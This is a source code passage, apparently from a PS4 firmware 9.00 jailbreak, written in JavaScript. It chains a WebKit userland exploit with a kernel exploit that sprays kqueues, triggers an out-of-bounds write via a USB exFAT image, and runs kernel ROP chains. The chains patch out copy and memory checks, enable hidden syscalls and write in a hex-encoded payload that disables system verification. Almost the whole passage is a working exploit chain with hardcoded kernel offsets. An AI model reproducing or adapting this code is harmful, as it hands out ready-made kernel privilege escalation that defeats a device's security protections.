		p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]
		function launch_chain(chain) {
			chain.push(window.gadgets["pop rdi"]);
			chain.push(original_context);
			chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
			p.write8(textAreaVtPtr, fakeVtable_setjmp);
			textArea.scrollLeft = 0x0;
			p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
			p.write8(modified_context.add32(0x10), chain.stack);
			p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))
			p.write8(textAreaVtPtr, fakeVtable_longjmp);
			textArea.scrollLeft = 0x0;
			p.write8(textAreaVtPtr, textAreaVtable);
		}
		var kview = new Uint8Array(0x1000);
		var kstr = p.leakval(kview).add32(0x10);
		var orig_kview_buf = p.read8(kstr);
		p.write8(kstr, window.libKernelBase);
		p.write4(kstr.add32(8), 0x40000);
		var countbytes;
		for(var i = 0; i < 0x40000; i++) {
			if(kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
				countbytes = i;
				break;
			}
		}
		p.write4(kstr.add32(8), countbytes + 32);
		var dview32 = new Uint32Array(1);
		var dview8 = new Uint8Array(dview32.buffer);
		for(var i = 0; i < countbytes; i++) {
			if(kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
				dview8[0] = kview[i + 3];
				dview8[1] = kview[i + 4];
				dview8[2] = kview[i + 5];
				dview8[3] = kview[i + 6];
				var syscallno = dview32[0];
				window.syscalls[syscallno] = window.libKernelBase.add32(i);
			}
		}
		p.write8(kstr, orig_kview_buf);
		chain = new rop();
		//Sanity check
		if(chain.syscall(20).low == 0) {
			alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
			while(1);
		}
	}

	function run_hax() {
		userland();
		if(chain.syscall(23, 0).low != 0x0) {
			kernel();
			//this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
		} else {
			if(fanthres() === 'on') setTimeout(fan, 500);
			setTimeout(injectPayload, 500);
		}
	}

	function kernel() {
		extra_gadgets();
		kchain_setup();
		object_setup();
		trigger_spray();
	}
	var handle;
	var random_path;
	var ex_info;

	function load_prx(name) {
		//sys_dynlib_load_prx
		var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
		if(res.low != 0x0) {
			alert("failed to load prx/get handle " + name);
		}
		//sys_dynlib_get_info_ex
		p.write8(ex_info, 0x1A8);
		res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
		if(res.low != 0x0) {
			alert("failed to get module info from handle");
		}
		var tlsinit = p.read8(ex_info.add32(0x110));
		var tlssize = p.read4(ex_info.add32(0x11C));
		if(tlssize != 0) {
			if(name == "libSceWebKit2.sprx") {
				tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
			} else {
				alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
			}
		}
		return tlsinit;
	}
	//Obtain extra gadgets through module loading
	function extra_gadgets() {
		handle = p.malloc(0x1E8);
		var randomized_path_length_ptr = handle.add32(0x4);
		var randomized_path_ptr = handle.add32(0x14);
		ex_info = randomized_path_ptr.add32(0x40);
		p.write8(randomized_path_length_ptr, 0x2C);
		chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
		random_path = p.readstr(randomized_path_ptr);
		var ipmi_addr = load_prx("libSceIpmi.sprx");
		var hmd_addr = load_prx("libSceHmd.sprx");
		var wk2_addr = load_prx("libSceWebKit2.sprx");
		for(var gadget in hmd_gadgetmap) {
			window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
		}
		for(var gadget in wk2_gadgetmap) {
			window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
		}
		for(var gadget in ipmi_gadgetmap) {
			window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
		}
		for(var gadget in window.gadgets) {
			p.read8(window.gadgets[gadget]);
			//Ensure all gadgets are available to kernel.
			chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
		}
		chain.run();
	}
	//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
	function kchain_setup() {
		const KERNEL_busy = 0x1B28DF8;
		const KERNEL_bcopy = 0xACD;
		const KERNEL_bzero = 0x2713FD;
		const KERNEL_pagezero = 0x271441;
		const KERNEL_memcpy = 0x2714BD;
		const KERNEL_pagecopy = 0x271501;
		const KERNEL_copyin = 0x2716AD;
		const KERNEL_copyinstr = 0x271B5D;
		const KERNEL_copystr = 0x271C2D;
		const KERNEL_setidt = 0x312c40;
		const KERNEL_setcr0 = 0x1FB949;
		const KERNEL_Xill = 0x17d500;
		const KERNEL_veriPatch = 0x626874;
		const KERNEL_enable_syscalls_1 = 0x490;
		const KERNEL_enable_syscalls_2 = 0x4B5;
		const KERNEL_enable_syscalls_3 = 0x4B9;
		const KERNEL_enable_syscalls_4 = 0x4C2;
		const KERNEL_mprotect = 0x80B8D;
		const KERNEL_prx = 0x23AEC4;
		const KERNEL_dlsym_1 = 0x23B67F;
		const KERNEL_dlsym_2 = 0x221b40;
		const KERNEL_setuid = 0x1A06;
		const KERNEL_syscall11_1 = 0x1100520;
		const KERNEL_syscall11_2 = 0x1100528;
		const KERNEL_syscall11_3 = 0x110054C;
		const KERNEL_syscall11_gadget = 0x4c7ad;
		const KERNEL_mmap_1 = 0x16632A;
		const KERNEL_mmap_2 = 0x16632D;
		const KERNEL_setcr0_patch = 0x3ade3B;
		const KERNEL_kqueue_close_epi = 0x398991;
		SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
		KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
		//negative offset of kqueue string to kernel base
		//0xFFFFFFFFFF86B593 0x505
		//0xFFFFFFFFFF80E364 0x900
		p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
		kchain = new rop();
		kchain2 = new rop();
		//Ensure the krop stack remains available.
		{
			chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
			chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
			chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
		}
		chain.run();
		kchain.count = 0;
		kchain2.count = 0;
		kchain.set_kernel_var(KERNEL_BASE_PTR);
		kchain2.set_kernel_var(KERNEL_BASE_PTR);
		kchain.push(gadgets["pop rax"]);
		kchain.push(SAVED_KERNEL_STACK_PTR);
		kchain.push(gadgets["mov [rax], rdi"]);
		kchain.push(gadgets["pop r8"]);
		kchain.push(KERNEL_BASE_PTR);
		kchain.push(gadgets["add [r8], r12"]);
		//Sorry we're closed
		kchain.kwrite1(KERNEL_busy, 0x1);
		kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.
		var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
		var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
		//Modify UD
		kchain.push(gadgets["pop rdi"]);
		kchain.push(0x6);
		kchain.push(gadgets["pop rsi"]);
		kchain.push(gadgets["mov rsp, rdi"]);
		kchain.push(gadgets["pop rdx"]);
		kchain.push(0xE);
		kchain.push(gadgets["pop rcx"]);
		kchain.push(0x0);
		kchain.push(gadgets["pop r8"]);
		kchain.push(0x0);
		var idx1_dest = kchain.get_rsp();
		kchain.pushSymbolic(); // overwritten with KERNEL_setidt
		kchain.push(gadgets["pop rsi"]);
		kchain.push(0x80040033);
		kchain.push(gadgets["pop rdi"]);
		kchain.push(kchain2.stack);
		var idx2_dest = kchain.get_rsp();
		kchain.pushSymbolic(); // overwritten with KERNEL_setcr0
		kchain.finalizeSymbolic(idx1, idx1_dest);
		kchain.finalizeSymbolic(idx2, idx2_dest);
		//Initial patch(es)
		kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
		kchain2.kwrite1(KERNEL_bcopy, 0xEB);
		//might as well do the others
		kchain2.kwrite1(KERNEL_bzero, 0xEB);
		kchain2.kwrite1(KERNEL_pagezero, 0xEB);
		kchain2.kwrite1(KERNEL_memcpy, 0xEB);
		kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
		kchain2.kwrite1(KERNEL_copyin, 0xEB);
		kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
		kchain2.kwrite1(KERNEL_copystr, 0xEB);
		//I guess you're not all that bad...
		kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again
		//Restore original UD
		var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
		var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
		kchain2.push(gadgets["pop rdi"]);
		kchain2.push(0x6);
		kchain2.push(gadgets["pop rsi"]);
		var idx3_dest = kchain2.get_rsp();
		kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
		kchain2.push(gadgets["pop rdx"]);
		kchain2.push(0xE);
		kchain2.push(gadgets["pop rcx"]);
		kchain2.push(0x0);
		kchain2.push(gadgets["pop r8"]);
		kchain2.push(0x0);
		var idx4_dest = kchain2.get_rsp();
		kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 
		kchain2.finalizeSymbolic(idx3, idx3_dest);
		kchain2.finalizeSymbolic(idx4, idx4_dest);
		//Apply kernel patches    
		kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
		//patch in reverse because /shrug
		kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
		kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
		kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
		kchain2.kwrite1(KERNEL_setuid, 0xEB);
		kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
		kchain2.kwrite2(KERNEL_prx, 0xE990);
		kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
		kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
		kchain2.kwrite1(KERNEL_mmap_1, 0x37);
		kchain2.kwrite1(KERNEL_mmap_2, 0x37);
		kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
		kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
		kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
		//Restore CR0
		kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
		var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
		kchain2.push(gadgets["pop rdi"]);
		kchain2.push(0x80050033);
		var idx5_dest = kchain2.get_rsp();
		kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
		kchain2.finalizeSymbolic(idx5, idx5_dest);
		//Recover
		kchain2.rax_kernel(KERNEL_kqueue_close_epi);
		kchain2.push(gadgets["mov rdx, rax"]);
		kchain2.push(gadgets["pop rsi"]);
		kchain2.push(SAVED_KERNEL_STACK_PTR);
		kchain2.push(gadgets["mov rax, [rsi]"]);
		kchain2.push(gadgets["pop rcx"]);
		kchain2.push(0x10);
		kchain2.push(gadgets["add rax, rcx"]);
		kchain2.push(gadgets["mov [rax], rdx"]);
		kchain2.push(gadgets["pop rdi"]);
		var idx6 = kchain2.pushSymbolic();
		kchain2.push(gadgets["mov [rdi], rax"]);
		kchain2.push(gadgets["sti"]);
		kchain2.push(gadgets["pop rsp"]);
		var idx6_dest = kchain2.get_rsp();
		kchain2.pushSymbolic(); // overwritten with old stack pointer
		kchain2.finalizeSymbolic(idx6, idx6_dest);
	}

	function object_setup() {
		//Map fake object
		var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
		var fake_filtops = fake_knote.add32(0x4000);
		var fake_obj = fake_knote.add32(0x8000);
		if(fake_knote.low != 0x4000) {
			alert("enomem: " + fake_knote);
			while(1);
		}
		//setup fake object
		//KNOTE
		{
			p.write8(fake_knote, fake_obj);
			p.write8(fake_knote.add32(0x68), fake_filtops)
		}
		//FILTOPS
		{
			p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
			p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
			p.write8(fake_filtops.add32(0x8), kchain.stack);
			p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
		}
		//OBJ
		{
			p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
		}
		//Ensure the fake knote remains available
		chain.syscall(203, fake_knote, 0xC000);
	}
	var trigger_spray = function() {
		var NUM_KQUEUES = 0x1B0;
		var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
		//Make kqueues
		{
			for(var i = 0; i < NUM_KQUEUES; i++) {
				chain.fcall(window.syscalls[362]);
				chain.write_result4(kqueue_ptr.add32(0x4 * i));
			}
		}
		chain.run();
		var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
		var that_one_socket = chain.syscall(97, 2, 1, 0);
		if(that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
			alert("invalid socket");
			while(1);
		}
		//Spray kevents
		var kevent = p.malloc(0x20);
		p.write8(kevent.add32(0x0), that_one_socket);
		p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
		p.write4(kevent.add32(0xC), 0x0);
		p.write8(kevent.add32(0x10), 0x0);
		p.write8(kevent.add32(0x18), 0x0);
		//
		{
			for(var i = 0; i < NUM_KQUEUES; i++) {
				chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
			}
		}
		chain.run();
		//Fragment memory
		{
			for(var i = 18; i < NUM_KQUEUES; i += 2) {
				chain.fcall(window.syscalls[6], kqueues[i]);
			}
		}
		chain.run();
		//Trigger OOB
		//ESP8266 enable usb - stooged
		showMessage("Loading USB, ExFatHax...");
		bar.style.width = "33%";
		enableUSB();
		sleep(1 * USBWait()).then(() => {
			//Trigger corrupt knote
			{
				for(var i = 1; i < NUM_KQUEUES; i += 2) {
					chain.fcall(window.syscalls[6], kqueues[i]);
				}
			}
			chain.run();
			if(chain.syscall(23, 0).low == 0) {
				//cleanup fake knote & release locked gadgets/stack.
				chain.fcall(window.syscalls[73], 0x4000, 0xC000);
				chain.fcall(window.syscalls[325]);
				chain.run();
				disableUSB();
				//This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
				var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
				var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
				var PatchPl = [0x00000BB8, 0xFE894800, 0x033D8D48, 0x0F000000, 0x4855C305, 0x8B48E589, 0x95E8087E, 0xE8000000, 0x00000175, 0x033615FF, 0x8B480000, 0x0003373D, 0x3F8B4800, 0x74FF8548, 0x3D8D48EB, 0x0000029D, 0xF9358B48, 0x48000002, 0x0322158B, 0x8B480000, 0x00D6E812, 0x8D480000, 0x00029F3D, 0x358B4800, 0x000002E4, 0x05158B48, 0x48000003, 0xB9E8128B, 0x48000000, 0x02633D8D, 0x8B480000, 0x0002BF35, 0x158B4800, 0x000002C8, 0xE8128B48, 0x0000009C, 0x7A3D8D48, 0x48000002, 0x02AA358B, 0x8B480000, 0x0002AB15, 0x128B4800, 0x00007FE8, 0x0185E800, 0xC35D0000, 0x6D3D8948, 0x48000002, 0x026E3D01, 0x01480000, 0x00026F3D, 0x3D014800, 0x00000270, 0x713D0148, 0x48000002, 0x02723D01, 0x01480000, 0x0002933D, 0x3D014800, 0x00000294, 0x653D0148, 0x48000002, 0x02663D01, 0x01480000, 0x0002873D, 0x3D014800, 0x00000288, 0x893D0148, 0x48000002, 0x028A3D01, 0x01480000, 0x00028B3D, 0x3D014800, 0x0000024C, 0x3D3D0148, 0xC3000002, 0xE5894855, 0x10EC8348, 0x24348948, 0x24548948, 0xED15FF08, 0x48000001, 0x4B74C085, 0x48C28948, 0x4840408B, 0x2F74C085, 0x28788B48, 0x243C3B48, 0x8B480A74, 0xC0854800, 0xECEB1D74, 0x18788B48, 0x74FF8548, 0x7F8B48ED, 0x7C3B4810, 0xE2750824, 0xFF1040C7, 0x48FFFFFF, 0x31107A8D, 0x31D231F6, 0xA515FFC9, 0x48000001, 0x5D10C483, 0x894855C3, 0xC0200FE5, 0xFFFF2548, 0x220FFFFE, 0x3D8B48C0, 0x000001C8, 0x909007C7, 0x47C79090, 0x48909004, 0x358B48B8, 0x000001AC, 0x08778948, 0x651047C7, 0xC73C8B48, 0x00251447, 0x47C70000, 0x89480018, 0x1C47C738, 0xB8489090, 0x7D358B48, 0x48000001, 0xC7207789, 0xC7482847, 0x47C70100, 0x0000002C, 0x778D48E9, 0x158B4834, 0x00000150, 0x89F22948, 0x8B483057, 0x00016B35, 0x568D4800, 0xD7294805, 0xC148FF89, 0x814808E7, 0x0000E9CF, 0x3E894800, 0x00000D48, 0x220F0001, 0x55C35DC0, 0x0FE58948, 0x2548C020, 0xFFFEFFFF, 0x48C0220F, 0x013A3D8B, 0x07C70000, 0x00C3C031, 0x353D8B48, 0xC7000001, 0xC3C03107, 0x3D8B4800, 0x00000130, 0xC03107C7, 0x8B4800C3, 0x00012B3D, 0x3107C700, 0x4800C3C0, 0x00A63D8B, 0x87C70000, 0x001F1E01, 0x9090F631, 0x1E0587C7, 0xC931001F, 0x87C79090, 0x001F1E09, 0x9090D231, 0x1E3E87C7, 0xC931001F, 0x0D489090, 0x00010000, 0xFFC0220F, 0x0000EF15, 0xC0200F00, 0xFFFF2548, 0x220FFFFE, 0x3D8B48C0, 0x000000DC, 0xC03107C7, 0x0D4800C3, 0x00010000, 0x5DC0220F, 0x737973C3, 0x5F6D6574, 0x70737573, 0x5F646E65, 0x73616870, 0x705F3265, 0x735F6572, 0x00636E79, 0x74737973, 0x725F6D65, 0x6D757365, 0x68705F65, 0x32657361, 0x73797300, 0x5F6D6574, 0x75736572, 0x705F656D, 0x65736168, 0x90900033, 0x00000000, 0x00000000, 0x000F88F0, 0x00000000, 0x002EF170, 0x00000000, 0x00018DF0, 0x00000000, 0x00018EF0, 0x00000000, 0x02654110, 0x00000000, 0x00097230, 0x00000000, 0x00402E60, 0x00000000, 0x01520108, 0x00000000, 0x01520100, 0x00000000, 0x00462D20, 0x00000000, 0x00462DFC, 0x00000000, 0x006259A0, 0x00000000, 0x006268D0, 0x00000000, 0x00625DC0, 0x00000000, 0x00626290, 0x00000000, 0x00626720, 0x00000000];
				for(var i = 0; i < PatchPl.length; i++) {
					patch_buffer_view[i] = PatchPl[i];
				}
				chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
				chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
				chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
				chain.run();
				if(fanthres() === 'on') setTimeout(fan, 500);
				setTimeout(injectPayload, 500);
			} else {
				disableUSB();
				alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
				p.write8(0, 0);
			}
		});
	}